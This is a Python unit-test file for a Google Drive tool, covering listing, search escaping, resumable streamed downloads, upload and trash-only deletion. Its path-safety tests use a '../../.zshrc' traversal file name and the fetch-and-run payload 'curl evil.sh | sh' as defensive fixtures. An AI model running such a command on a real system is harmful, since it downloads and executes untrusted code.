"""Unit tests for connectonion/useful_tools/gdrive.py

Tests cover:
- scope validation at construction
- token refresh once per instance (mirrors the Gmail contract)
- list_files/search_files normalization, paging, and query escaping
- download: binary via get_media, Google-native via export_media, shortcut resolution
- upload and delete (trash, not permanent)
"""

import hashlib
import os
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from unittest.mock import MagicMock, patch

import pytest
import requests

NATIVE_DOC = "application/vnd.google-apps.document"
ENV = {
    "GOOGLE_SCOPES": "gmail.send,gmail.readonly,gmail.modify,calendar,drive",
    "GOOGLE_ACCESS_TOKEN": "test-token",
    "GOOGLE_REFRESH_TOKEN": "test-refresh",
}


@pytest.fixture(autouse=True)
def _stub_token_refresh(request, monkeypatch):
    """Drive refreshes its access token once per instance; stub that network
    call so API-operation tests stay isolated. Tests of the refresh flow
    itself opt out with @pytest.mark.real_refresh."""
    if "real_refresh" in request.keywords:
        return
    from connectonion.useful_tools.gdrive import GDrive
    monkeypatch.setattr(GDrive, "_refresh_via_backend", lambda self, rt: "test-token")


def drive_with_service(service):
    """Build a GDrive whose _get_service() returns the given mock."""
    from connectonion.useful_tools.gdrive import GDrive
    drive = GDrive()
    drive._service = service
    return drive


def file_resource(**overrides):
    resource = {
        "id": "file-1",
        "name": "Report.pdf",
        "mimeType": "application/pdf",
        "modifiedTime": "2026-07-26T14:30:00.000Z",
        "size": "2048",
        "webViewLink": "https://drive.google.com/file/d/file-1/view",
    }
    resource.update(overrides)
    return resource


class FakeDrive:
    """A loopback stand-in for Drive's media endpoint: serves `body`, honours Range, and can misbehave.

    limit: no byte at or past this offset is sent; then, by `mode`, the
    connection closes ("drop"), goes silent ("stall"), or waits for `gate`
    and sends the rest ("gate").
    """

    def __init__(self, body: bytes):
        self.body, self.ranges = body, []
        self.limit, self.mode, self.gate = None, "drop", threading.Event()
        self.ignore_range, self.closing = False, threading.Event()
        fake = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *args):
                pass

            def do_GET(self):
                fake.handle(self)

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.server.daemon_threads = True
        self.url = f"http://127.0.0.1:{self.server.server_address[1]}/files"
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()

    def handle(self, request):
        header = request.headers.get("Range", "")
        self.ranges.append(header)
        start = 0 if self.ignore_range or not header else int(header.removeprefix("bytes=").rstrip("-"))
        request.send_response(206 if start else 200)
        request.send_header("Content-Length", str(len(self.body) - start))
        request.end_headers()
        stop = len(self.body) if self.limit is None else max(self.limit, start)
        self.send(request, start, stop)
        if stop == len(self.body) or self.mode == "drop":
            return
        if self.mode == "stall":
            self.closing.wait()
            return
        self.gate.wait()
        self.send(request, stop, len(self.body))

    def send(self, request, start, stop):
        for offset in range(start, stop, 64 * 1024):
            request.wfile.write(self.body[offset:min(offset + 64 * 1024, stop)])
        request.wfile.flush()

    def close(self):
        self.closing.set()
        self.gate.set()
        self.server.shutdown()
        self.server.server_close()
        self.thread.join()


@pytest.fixture
def fake_drive(monkeypatch):
    """Serve 20 MB of incompressible bytes at a loopback media URL; stalls give up after 0.3 s."""
    from connectonion.useful_tools import gdrive
    fake = FakeDrive(os.urandom(20 * 1024 * 1024))
    monkeypatch.setattr(gdrive, "DRIVE_FILES_URL", fake.url)
    monkeypatch.setattr(gdrive, "STALL_SECONDS", 0.3)
    monkeypatch.setattr(gdrive, "PROGRESS_SECONDS", 0)
    yield fake
    fake.close()


def streaming_drive(fake, name="Interview.mov", **kwargs):
    """A GDrive, as the CLI builds it, whose file is `fake`'s body fetched over plain HTTP."""
    from connectonion.useful_tools.gdrive import GDrive
    kwargs.setdefault("allow_external_downloads", True)
    with patch.dict(os.environ, ENV, clear=False):
        drive = GDrive(**kwargs)
    drive._get_meta = lambda file_id: {"id": file_id, "name": name, "mimeType": "video/quicktime",
                                       "size": str(len(fake.body)), "md5Checksum": hashlib.md5(fake.body).hexdigest()}
    drive._media_session = requests.Session
    return drive


class TestGDriveInit:

    def test_requires_drive_scope(self):
        with patch.dict(os.environ, {"GOOGLE_SCOPES": "gmail.send,calendar"}, clear=False):
            from connectonion.useful_tools.gdrive import GDrive
            with pytest.raises(ValueError) as exc:
                GDrive()
            assert "drive" in str(exc.value)
            assert "co auth google" in str(exc.value)

    def test_initializes_with_drive_scope(self):
        with patch.dict(os.environ, ENV, clear=False):
            from connectonion.useful_tools.gdrive import GDrive
            assert GDrive()._service is None

    @pytest.mark.real_refresh
    def test_missing_credentials_raise(self):
        with patch.dict(os.environ, {**ENV, "GOOGLE_ACCESS_TOKEN": "", "GOOGLE_REFRESH_TOKEN": ""}, clear=False):
            from connectonion.useful_tools.gdrive import GDrive
            with pytest.raises(ValueError) as exc:
                GDrive()._get_service()
            assert "Google account not connected" in str(exc.value)

    @pytest.mark.real_refresh
    @patch("connectonion.useful_tools.gdrive.build")
    def test_refreshes_token_before_building_service(self, mock_build, monkeypatch):
        """Same contract as Gmail: refresh up front, never trust a cached token."""
        from connectonion.useful_tools.gdrive import GDrive
        calls = []
        monkeypatch.setattr(GDrive, "_refresh_via_backend", lambda self, rt: calls.append(rt) or "fresh")

        with patch.dict(os.environ, ENV, clear=False):
            GDrive()._get_service()

        assert calls == [None]
        assert mock_build.call_args.kwargs["credentials"].token == "fresh"

    @pytest.mark.real_refresh
    def test_backend_refresh_error_does_not_expose_provider_body(self, monkeypatch):
        from connectonion.useful_tools.gdrive import GDrive

        monkeypatch.setenv("OPENONION_API_KEY", "opaque-api-key")
        monkeypatch.setenv("GOOGLE_REFRESH_TOKEN", "local-refresh-secret")
        response = MagicMock(status_code=502, text="provider-refresh-secret")

        with patch("httpx.post", return_value=response):
            with pytest.raises(ValueError) as error:
                GDrive.__new__(GDrive)._refresh_via_backend("local-refresh-secret")

        assert "HTTP 502" in str(error.value)
        assert error.value.code == "provider_unavailable"
        assert "provider-refresh-secret" not in str(error.value)
        assert "local-refresh-secret" not in str(error.value)


class TestListFiles:

    def test_normalizes_and_excludes_trash(self):
        service = MagicMock()
        service.files.return_value.list.return_value.execute.return_value = {
            "files": [file_resource(), file_resource(id="file-2", name="Notes", size=None)]
        }

        with patch.dict(os.environ, ENV, clear=False):
            files = drive_with_service(service).list_files(last=20)

        assert files[0] == {
            "id": "file-1",
            "name": "Report.pdf",
            "type": "application/pdf",
            "modified": "2026-07-26T14:30:00.000Z",
            "size": 2048,
            "link": "https://drive.google.com/file/d/file-1/view",
        }
        # Folders and native docs report no size at all.
        assert files[1]["size"] == 0
        assert service.files.return_value.list.call_args.kwargs["q"] == "trashed = false"

    def test_orders_by_most_recently_modified(self):
        service = MagicMock()
        service.files.return_value.list.return_value.execute.return_value = {"files": []}

        with patch.dict(os.environ, ENV, clear=False):
            drive_with_service(service).list_files()

        assert service.files.return_value.list.call_args.kwargs["orderBy"] == "modifiedTime desc"

    def test_requests_the_fields_it_reads(self):
        """Without an explicit nested fields string Drive omits size/modifiedTime."""
        service = MagicMock()
        service.files.return_value.list.return_value.execute.return_value = {"files": []}

        with patch.dict(os.environ, ENV, clear=False):
            drive_with_service(service).list_files()

        fields = service.files.return_value.list.call_args.kwargs["fields"]
        assert fields.startswith("nextPageToken, files(")
        for name in ("id", "name", "mimeType", "modifiedTime", "size", "webViewLink"):
            assert name in fields

    def test_pages_until_enough_files(self):
        service = MagicMock()
        service.files.return_value.list.return_value.execute.side_effect = [
            {"files": [file_resource(id=f"a{i}") for i in range(100)], "nextPageToken": "page2"},
            {"files": [file_resource(id="b1"), file_resource(id="b2")]},
        ]

        with patch.dict(os.environ, ENV, clear=False):
            files = drive_with_service(service).list_files(last=101)

        assert len(files) == 101
        assert files[-1]["id"] == "b1"

    def test_stops_when_drive_runs_out(self):
        service = MagicMock()
        service.files.return_value.list.return_value.execute.return_value = {"files": [file_resource()]}

        with patch.dict(os.environ, ENV, clear=False):
            files = drive_with_service(service).list_files(last=50)

        assert len(files) == 1

    def test_zero_returns_empty_without_calling_drive(self):
        service = MagicMock()

        with patch.dict(os.environ, ENV, clear=False):
            assert drive_with_service(service).list_files(last=0) == []

        service.files.assert_not_called()


class TestSearchFiles:

    def test_builds_name_query_and_excludes_trash(self):
        service = MagicMock()
        service.files.return_value.list.return_value.execute.return_value = {"files": [file_resource()]}

        with patch.dict(os.environ, ENV, clear=False):
            drive_with_service(service).search_files("report")

        assert service.files.return_value.list.call_args.kwargs["q"] == (
            "name contains 'report' and trashed = false"
        )

    def test_escapes_quotes_so_the_query_cannot_break_out(self):
        """An apostrophe in a filename would otherwise make Drive reject the request."""
        service = MagicMock()
        service.files.return_value.list.return_value.execute.return_value = {"files": []}

        with patch.dict(os.environ, ENV, clear=False):
            drive_with_service(service).search_files("Bob's plan")

        assert service.files.return_value.list.call_args.kwargs["q"] == (
            "name contains 'Bob\\'s plan' and trashed = false"
        )

    def test_escapes_backslashes(self):
        service = MagicMock()
        service.files.return_value.list.return_value.execute.return_value = {"files": []}

        with patch.dict(os.environ, ENV, clear=False):
            drive_with_service(service).search_files("a\\b")

        assert "a\\\\b" in service.files.return_value.list.call_args.kwargs["q"]

    def test_blank_query_returns_empty_without_calling_drive(self):
        service = MagicMock()

        with patch.dict(os.environ, ENV, clear=False):
            assert drive_with_service(service).search_files("   ") == []

        service.files.assert_not_called()


class TestDownload:

    @pytest.fixture(autouse=True)
    def _inside_the_project(self, tmp_path, monkeypatch):
        """Agents download inside the project only (#1753); tmp_path is it here."""
        monkeypatch.chdir(tmp_path)

    def _stub_download(self, monkeypatch, payload=b"filebytes"):
        """Make MediaIoBaseDownload write payload into the buffer in one chunk."""
        def fake_downloader(buffer, request, chunksize=None):
            downloader = MagicMock()

            def next_chunk():
                buffer.write(payload)
                return (None, True)

            downloader.next_chunk.side_effect = next_chunk
            return downloader

        monkeypatch.setattr("connectonion.useful_tools.gdrive.MediaIoBaseDownload", fake_downloader)

    @staticmethod
    def _streamed(service, fake):
        """A drive over `service` whose binary bytes come from `fake`."""
        drive = drive_with_service(service)
        drive._media_session = requests.Session
        return drive

    @staticmethod
    def _binary(fake, **overrides):
        return file_resource(size=str(len(fake.body)), md5Checksum=hashlib.md5(fake.body).hexdigest(), **overrides)

    def test_binary_file_streams_its_media(self, tmp_path, fake_drive):
        service = MagicMock()
        service.files.return_value.get.return_value.execute.return_value = self._binary(fake_drive)

        with patch.dict(os.environ, ENV, clear=False):
            result = self._streamed(service, fake_drive).download("file-1", dest=str(tmp_path))

        service.files.return_value.export_media.assert_not_called()
        assert fake_drive.ranges == [""]
        assert (tmp_path / "Report.pdf").read_bytes() == fake_drive.body
        assert "Report.pdf" in result

    def test_google_doc_is_exported_with_an_extension(self, tmp_path, monkeypatch):
        """A Doc has no bytes of its own — downloading it must export instead."""
        self._stub_download(monkeypatch, b"# Title")
        service = MagicMock()
        service.files.return_value.get.return_value.execute.return_value = file_resource(
            name="Design Notes",
            mimeType="application/vnd.google-apps.document",
            size=None,
        )

        with patch.dict(os.environ, ENV, clear=False):
            drive_with_service(service).download("file-1", dest=str(tmp_path))

        service.files.return_value.export_media.assert_called_once()
        assert service.files.return_value.export_media.call_args.kwargs["mimeType"] == "text/markdown"
        assert (tmp_path / "Design Notes.md").read_bytes() == b"# Title"

    def test_sheet_exports_to_csv(self, tmp_path, monkeypatch):
        self._stub_download(monkeypatch, b"a,b\n1,2\n")
        service = MagicMock()
        service.files.return_value.get.return_value.execute.return_value = file_resource(
            name="Budget", mimeType="application/vnd.google-apps.spreadsheet", size=None,
        )

        with patch.dict(os.environ, ENV, clear=False):
            drive_with_service(service).download("file-1", dest=str(tmp_path))

        assert service.files.return_value.export_media.call_args.kwargs["mimeType"] == "text/csv"
        assert (tmp_path / "Budget.csv").exists()

    def test_folder_download_is_refused_with_a_clear_message(self, tmp_path):
        service = MagicMock()
        service.files.return_value.get.return_value.execute.return_value = file_resource(
            name="Projects", mimeType="application/vnd.google-apps.folder", size=None,
        )

        with patch.dict(os.environ, ENV, clear=False):
            with pytest.raises(ValueError) as exc:
                drive_with_service(service).download("file-1", dest=str(tmp_path))

        assert "folder" in str(exc.value)
        assert "Projects" in str(exc.value)

    def test_shortcut_resolves_to_its_target(self, tmp_path, fake_drive):
        service = MagicMock()
        service.files.return_value.get.return_value.execute.side_effect = [
            file_resource(
                id="shortcut-1",
                name="Link to Report",
                mimeType="application/vnd.google-apps.shortcut",
                size=None,
                shortcutDetails={"targetId": "file-1"},
            ),
            self._binary(fake_drive),
        ]

        with patch.dict(os.environ, ENV, clear=False):
            self._streamed(service, fake_drive).download("shortcut-1", dest=str(tmp_path))

        assert (tmp_path / "Report.pdf").read_bytes() == fake_drive.body

    def test_explicit_destination_path_is_honoured(self, tmp_path, fake_drive):
        service = MagicMock()
        service.files.return_value.get.return_value.execute.return_value = self._binary(fake_drive)
        target = tmp_path / "renamed.pdf"

        with patch.dict(os.environ, ENV, clear=False):
            self._streamed(service, fake_drive).download("file-1", dest=str(target))

        assert target.read_bytes() == fake_drive.body


class TestStreamedDownload:
    """A video streams to disk, reports progress, resumes, and says when it is stuck (#3002)."""

    def test_bytes_reach_disk_while_the_download_runs(self, fake_drive, tmp_path):
        fake_drive.limit, fake_drive.mode = len(fake_drive.body) // 2, "gate"
        lines, result = [], {}
        worker = threading.Thread(target=lambda: result.update(
            path=streaming_drive(fake_drive).download("vid", dest=str(tmp_path), progress=lines.append)))
        worker.start()
        part = tmp_path / "Interview.mov.part"
        deadline = time.monotonic() + 10
        while (not part.exists() or part.stat().st_size < fake_drive.limit) and time.monotonic() < deadline:
            time.sleep(0.01)
        half_way = part.stat().st_size
        fake_drive.gate.set()
        worker.join(timeout=20)

        assert half_way >= fake_drive.limit, "nothing was written before the download finished"
        assert (tmp_path / "Interview.mov").read_bytes() == fake_drive.body
        assert not part.exists()
        assert any("MB of 20.0 MB" in line and "/s" in line and "left" in line for line in lines), lines
        assert lines[-1].startswith("done: 20.0 MB")

    def test_a_dropped_connection_is_resumed_with_range(self, fake_drive, tmp_path):
        fake_drive.limit = 7 * 1024 * 1024
        served = []

        def lift_the_limit(line):
            served.append(line)
            fake_drive.limit = None   # the next connection serves the rest

        streaming_drive(fake_drive).download("vid", dest=str(tmp_path), progress=lift_the_limit)

        assert (tmp_path / "Interview.mov").read_bytes() == fake_drive.body
        assert fake_drive.ranges[0] == "" and fake_drive.ranges[-1] == f"bytes={7 * 1024 * 1024}-"
        assert any("connection dropped at 7.0 MB of 20.0 MB; resuming" in line for line in served), served

    def test_a_stuck_download_stops_keeps_its_part_and_the_rerun_resumes(self, fake_drive, tmp_path, monkeypatch):
        from connectonion.useful_tools import gdrive
        monkeypatch.setattr(gdrive, "STALL_RETRIES", 1)
        fake_drive.limit, fake_drive.mode = 5 * 1024 * 1024, "stall"
        lines = []

        with pytest.raises(gdrive.DriveDownloadError) as stuck:
            streaming_drive(fake_drive).download("vid", dest=str(tmp_path), progress=lines.append)

        part = tmp_path / "Interview.mov.part"
        assert str(stuck.value).startswith("Stuck: no data from Drive for 0.3 s at 5.0 MB of 20.0 MB, 2 times")
        assert str(part) in str(stuck.value) and "run the same command again" in str(stuck.value)
        assert any(line.startswith("stalled: no data from Drive") and "attempt 1 of 1" in line for line in lines)
        assert part.stat().st_size == 5 * 1024 * 1024
        assert not (tmp_path / "Interview.mov").exists()

        fake_drive.limit, lines = None, []
        streaming_drive(fake_drive).download("vid", dest=str(tmp_path), progress=lines.append)

        assert fake_drive.ranges[-1] == f"bytes={5 * 1024 * 1024}-"
        assert lines[0] == "resuming Interview.mov.part: 5.0 MB of 20.0 MB already on disk"
        assert (tmp_path / "Interview.mov").read_bytes() == fake_drive.body
        assert not part.exists()

    def test_a_part_left_by_a_killed_run_is_resumed(self, fake_drive, tmp_path):
        (tmp_path / "Interview.mov.part").write_bytes(fake_drive.body[:3_000_000])

        streaming_drive(fake_drive).download("vid", dest=str(tmp_path))

        assert fake_drive.ranges == ["bytes=3000000-"]
        assert (tmp_path / "Interview.mov").read_bytes() == fake_drive.body

    def test_a_part_that_is_not_this_file_is_removed_not_renamed(self, fake_drive, tmp_path):
        from connectonion.useful_tools.gdrive import DriveDownloadError
        (tmp_path / "Interview.mov.part").write_bytes(b"x" * 1000)

        with pytest.raises(DriveDownloadError, match="md5 differs"):
            streaming_drive(fake_drive).download("vid", dest=str(tmp_path))

        assert not (tmp_path / "Interview.mov").exists()
        assert not (tmp_path / "Interview.mov.part").exists()

    def test_a_server_that_ignores_range_restarts_from_zero(self, fake_drive, tmp_path):
        (tmp_path / "Interview.mov.part").write_bytes(fake_drive.body[:1000])
        fake_drive.ignore_range = True

        streaming_drive(fake_drive).download("vid", dest=str(tmp_path))

        assert (tmp_path / "Interview.mov").read_bytes() == fake_drive.body

    def test_a_finished_file_is_kept_and_the_new_one_gets_a_suffix(self, fake_drive, tmp_path):
        (tmp_path / "Interview.mov").write_bytes(b"mine")

        result = streaming_drive(fake_drive).download("vid", dest=str(tmp_path))

        assert (tmp_path / "Interview.mov").read_bytes() == b"mine"
        assert (tmp_path / "Interview-1.mov").read_bytes() == fake_drive.body
        assert "Interview-1.mov" in result


class TestDownloadStaysInItsFolder:
    """A Drive name is chosen by whoever shared the file, not by the user (#1753)."""

    @staticmethod
    def _drive(name, data=b"curl evil.sh | sh\n", **kwargs):
        from connectonion.useful_tools.gdrive import GDrive
        with patch.dict(os.environ, ENV, clear=False):
            drive = GDrive(**kwargs)
        # An exported doc: the in-memory path. A streamed file picks its name the same way (_target).
        drive._get_meta = lambda file_id: {"id": file_id, "name": name, "mimeType": NATIVE_DOC}
        drive._read_file = lambda file_id: {"name": name, "data": data}
        return drive

    def test_a_streamed_file_does_not_follow_a_symlink_at_its_name(self, tmp_path, monkeypatch, fake_drive):
        monkeypatch.chdir(tmp_path)
        outside = tmp_path / "outside.txt"
        outside.write_text("keep")
        (tmp_path / "Interview.mov").symlink_to(outside)
        (tmp_path / "Interview-1.mov.part").symlink_to(outside)

        streaming_drive(fake_drive).download("f", dest=str(tmp_path))

        assert outside.read_text() == "keep"
        assert not (tmp_path / "Interview-1.mov").exists()
        assert (tmp_path / "Interview-2.mov").read_bytes() == fake_drive.body

    def test_a_traversal_name_stays_in_the_destination(self, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)
        downloads = tmp_path / "project" / "downloads"
        downloads.mkdir(parents=True)
        victim = tmp_path / ".zshrc"
        victim.write_text("original shell config\n")

        result = self._drive("../../.zshrc").download("f", dest=str(downloads))

        assert victim.read_text() == "original shell config\n"
        assert (downloads / ".zshrc").read_bytes() == b"curl evil.sh | sh\n"
        assert str(downloads / ".zshrc") in result

    def test_an_existing_file_is_kept_and_the_download_gets_a_suffix(self, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)
        (tmp_path / "Report.pdf").write_bytes(b"mine")

        result = self._drive("Report.pdf", b"theirs").download("f", dest=str(tmp_path))

        assert (tmp_path / "Report.pdf").read_bytes() == b"mine"
        assert (tmp_path / "Report-1.pdf").read_bytes() == b"theirs"
        assert "Report-1.pdf" in result

    def test_a_symlink_at_the_name_is_not_followed(self, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)
        outside = tmp_path / "outside.txt"
        outside.write_text("keep")
        (tmp_path / "notes.txt").symlink_to(outside)

        self._drive("notes.txt", b"new").download("f", dest=str(tmp_path))

        assert outside.read_text() == "keep"
        assert (tmp_path / "notes-1.txt").read_bytes() == b"new"

    def test_control_characters_cannot_forge_output(self, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)

        result = self._drive("a\x1b[31mb.txt", b"x").download("f", dest=str(tmp_path))

        assert "\x1b" not in result
        assert (tmp_path / "a_[31mb.txt").read_bytes() == b"x"

    def test_the_agent_tool_refuses_a_destination_outside_the_project(self, tmp_path, monkeypatch):
        project = tmp_path / "project"
        project.mkdir()
        monkeypatch.chdir(project)

        with pytest.raises(PermissionError):
            self._drive("Report.pdf").download("f", dest=str(tmp_path))

        assert not (tmp_path / "Report.pdf").exists()

    def test_the_cli_may_download_anywhere_the_user_names(self, tmp_path, monkeypatch):
        project = tmp_path / "project"
        project.mkdir()
        monkeypatch.chdir(project)

        self._drive("Report.pdf", b"x", allow_external_downloads=True).download("f", dest=str(tmp_path))

        assert (tmp_path / "Report.pdf").read_bytes() == b"x"


class TestReadFileForAttachment:
    """Drive-to-Gmail reads stay in memory and obey Gmail's byte budget."""

    @staticmethod
    def _stub_download(monkeypatch, payload=b"filebytes"):
        def fake_downloader(buffer, request, chunksize=None):
            downloader = MagicMock()

            def next_chunk():
                buffer.write(payload)
                return (None, True)

            downloader.next_chunk.side_effect = next_chunk
            return downloader

        monkeypatch.setattr("connectonion.useful_tools.gdrive.MediaIoBaseDownload", fake_downloader)

    def test_binary_file_returns_name_type_link_and_bytes(self, monkeypatch):
        self._stub_download(monkeypatch, b"%PDF")
        service = MagicMock()
        service.files.return_value.get.return_value.execute.return_value = file_resource(size="4")

        with patch.dict(os.environ, ENV, clear=False):
            item = drive_with_service(service)._read_file("file-1", max_bytes=10)

        assert item == {
            "id": "file-1",
            "name": "Report.pdf",
            "type": "application/pdf",
            "size": 4,
            "link": "https://drive.google.com/file/d/file-1/view",
            "data": b"%PDF", "original_type":"application/pdf", "export_type":None,
        }
        service.files.return_value.get_media.assert_called_once()

    def test_native_doc_is_exported_for_attachment(self, monkeypatch):
        self._stub_download(monkeypatch, b"# Notes")
        service = MagicMock()
        service.files.return_value.get.return_value.execute.return_value = file_resource(
            name="Notes", mimeType="application/vnd.google-apps.document", size=None,
        )

        with patch.dict(os.environ, ENV, clear=False):
            item = drive_with_service(service)._read_file("file-1")

        assert item["name"] == "Notes.md"
        assert item["type"] == "text/markdown"
        assert item["data"] == b"# Notes"
        service.files.return_value.export_media.assert_called_once_with(
            fileId="file-1", mimeType="text/markdown"
        )

    def test_known_oversize_is_rejected_before_downloading(self):
        service = MagicMock()
        service.files.return_value.get.return_value.execute.return_value = file_resource(size="11")

        with patch.dict(os.environ, ENV, clear=False):
            with pytest.raises(ValueError, match="attachment limit"):
                drive_with_service(service)._read_file("file-1", max_bytes=10)

        service.files.return_value.get_media.assert_not_called()

    def test_export_growth_is_rejected_during_download(self, monkeypatch):
        self._stub_download(monkeypatch, b"123456")
        service = MagicMock()
        service.files.return_value.get.return_value.execute.return_value = file_resource(
            name="Notes", mimeType="application/vnd.google-apps.document", size=None,
        )

        with patch.dict(os.environ, ENV, clear=False):
            with pytest.raises(ValueError, match="attachment limit"):
                drive_with_service(service)._read_file("file-1", max_bytes=5)

    def test_get_file_returns_only_metadata(self):
        service = MagicMock()
        service.files.return_value.get.return_value.execute.return_value = file_resource()

        with patch.dict(os.environ, ENV, clear=False):
            item = drive_with_service(service)._get_file("file-1")

        assert item["link"].startswith("https://drive.google.com/")
        assert "data" not in item
        service.files.return_value.get_media.assert_not_called()


class TestUploadAndDelete:

    def test_upload_sends_the_file_and_returns_its_dict(self, tmp_path, monkeypatch):
        monkeypatch.setattr(
            "connectonion.useful_tools.gdrive.MediaFileUpload",
            lambda path, mimetype=None, resumable=False: MagicMock(),
        )
        local = tmp_path / "report.pdf"
        local.write_bytes(b"data")
        service = MagicMock()
        service.files.return_value.create.return_value.execute.return_value = file_resource()

        with patch.dict(os.environ, ENV, clear=False):
            result = drive_with_service(service).upload(str(local))

        assert service.files.return_value.create.call_args.kwargs["body"] == {"name": "report.pdf"}
        assert result["id"] == "file-1"

    def test_upload_honours_an_explicit_name(self, tmp_path, monkeypatch):
        monkeypatch.setattr(
            "connectonion.useful_tools.gdrive.MediaFileUpload",
            lambda path, mimetype=None, resumable=False: MagicMock(),
        )
        local = tmp_path / "report.pdf"
        local.write_bytes(b"data")
        service = MagicMock()
        service.files.return_value.create.return_value.execute.return_value = file_resource()

        with patch.dict(os.environ, ENV, clear=False):
            drive_with_service(service).upload(str(local), name="Q3 Report.pdf")

        assert service.files.return_value.create.call_args.kwargs["body"]["name"] == "Q3 Report.pdf"

    def test_upload_missing_file_raises(self, tmp_path):
        service = MagicMock()

        with patch.dict(os.environ, ENV, clear=False):
            with pytest.raises(ValueError) as exc:
                drive_with_service(service).upload(str(tmp_path / "nope.pdf"))

        assert "not found" in str(exc.value)

    def test_delete_trashes_rather_than_destroying(self):
        """An agent calling this by mistake must be recoverable from the Drive UI."""
        service = MagicMock()

        with patch.dict(os.environ, ENV, clear=False):
            drive_with_service(service).delete("file-1")

        service.files.return_value.delete.assert_not_called()
        assert service.files.return_value.update.call_args.kwargs["body"] == {"trashed": True}

@pytest.mark.parametrize('resources,reason', [
    ([file_resource(id='a', shortcutDetails={'targetId':'b'}), file_resource(id='b', shortcutDetails={'targetId':'a'})], 'cycle'),
    ([file_resource(trashed=True)], 'trash'),
    ([file_resource(shortcutDetails={})], 'target'),
])
def test_metadata_rejects_unusable_targets_without_unbounded_recursion(resources, reason):
    service = MagicMock()
    service.files().get().execute.side_effect = resources
    with patch.dict(os.environ, ENV, clear=False):
        with pytest.raises(ValueError, match=reason):
            drive_with_service(service)._get_meta('a')
    assert service.files().get().execute.call_count <= 2


def test_info_reports_unknown_native_size_and_export_without_download():
    service = MagicMock()
    service.files().get().execute.return_value = file_resource(size=None, mimeType='application/vnd.google-apps.document')
    with patch.dict(os.environ, ENV, clear=False):
        info = drive_with_service(service).get_info('file-1')
    assert info['raw_size'] is None
    assert info['export_type'] == 'text/markdown'
    assert info['export_size'] is None
    service.files().export_media.assert_not_called()
